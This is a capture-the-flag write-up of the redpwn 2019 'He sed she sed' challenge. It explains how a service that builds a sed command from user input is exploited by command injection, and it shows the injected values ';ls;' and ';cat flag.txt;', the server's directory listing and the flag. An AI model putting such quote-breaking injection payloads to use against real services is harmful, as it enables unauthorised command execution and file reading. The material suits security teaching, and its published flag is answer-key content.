# He sed she sed - Misc

### [~$ cd ..](../)

>he sed she sed
>
>Written by: dns
>
>I'm not really sure what I sed to this program, so it fixes it for me!
>
>nc chall2.2019.redpwn.net 6004

This challenge was a basic command injection based on the command `sed` (which might be really powerful, as long as one knows how to use it!)

The service asks 3 questions
* What you thought you sed
* What you aren't sure you sed
* What you actually sed

and waits for an input for each of them. Finally, based on this input, it displays the message *You actually said* with the output of the command. Injecting a simple quote gave the first indication that something went wrong:
```
What you thought you sed
'
What you aren't sure you sed
'
What you actually sed
'
You actually said
 | sed s///g
```

We can see here that it's a substitution because of the `s`. The syntax of such command is as follows:

`sed s/<regex>/<replace by>/<flags> <string>`

Here, the flag is `g`, meaning that the substitution is globally applied. We control the other values, but because of the messages returned by the server, we know that some simple quotes are not properly closed. By closing the quotes properly and use semi-colon, we can inject our own commands:

```
$ nc chall2.2019.redpwn.net 6004
 What you thought you sed
 ';ls;'
 What you aren't sure you sed

 What you actually sed

 You actually said

bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
sed.py
srv
sys
tmp
usr
var
sh: 1: : Permission denied
```

Let's then `cat` the flag:

```
$ nc chall2.2019.redpwn.net 6004
 What you thought you sed
 ';cat flag.txt;'
 What you aren't sure you sed

 What you actually sed

 You actually said

 flag{th4ts_wh4t_sh3_sed}
 sh: 1: : Permission denied
```

FLAG: **flag{th4ts_wh4t_sh3_sed}**

EOF
